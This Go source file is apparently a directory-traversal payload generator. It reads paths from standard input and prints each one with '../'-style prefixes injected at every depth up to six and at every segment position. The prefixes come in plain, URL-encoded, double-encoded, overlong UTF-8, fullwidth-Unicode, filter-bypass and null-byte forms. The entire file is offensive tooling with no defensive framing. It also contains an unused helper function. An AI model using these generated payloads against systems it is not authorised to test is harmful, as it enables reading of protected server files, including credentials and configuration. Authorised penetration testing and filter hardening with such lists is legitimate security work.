package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

func main() {
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		generatePaths(strings.TrimSpace(scanner.Text()))
	}
}

func generatePaths(path string) {
	if path == "" {
		return
	}
	fmt.Println(path)
	patterns := buildPatterns()
	parts := strings.Split(strings.Trim(path, "/"), "/")
	
	for _, pattern := range patterns {
		for depth := 1; depth <= 6; depth++ {
			prefix := strings.Repeat(pattern, depth)
			fmt.Println(prefix + strings.Join(parts, "/"))
			if len(parts) > 1 {
				for i := 1; i < len(parts); i++ {
					injection := strings.Join(parts[:i], "/") + "/" + prefix + strings.Join(parts[i:], "/")
					fmt.Println(injection)
				}
			}
		}
	}
}

func buildPatterns() []string {
	base := []string{"../", "..\\", "./", ".\\"}
	encoded := []string{"%2e%2e/", "%2e%2e\\", "%252e%252e/", "%c0%ae%c0%ae/", "%c1%9c%c1%9c/"}
	unicode := []string{"\u002e\u002e/", "\u002e\u002e\\", "\uff0e\uff0e/"}
	double := []string{"....//", "....\\\\", "..../", "...\\"}
	null := []string{"..%00/", "..%00\\", "%2e%2e%00/"}
	
	var patterns []string
	patterns = append(patterns, base...)
	patterns = append(patterns, encoded...)
	patterns = append(patterns, unicode...)
	patterns = append(patterns, double...)
	patterns = append(patterns, null...)
	return patterns
}

func injectPattern(parts []string, pattern string, pos int) string {
	if pos >= len(parts) {
		return ""
	}
	result := make([]string, len(parts))
	copy(result, parts)
	result[pos] = pattern + result[pos]
	return strings.Join(result, "/")
}
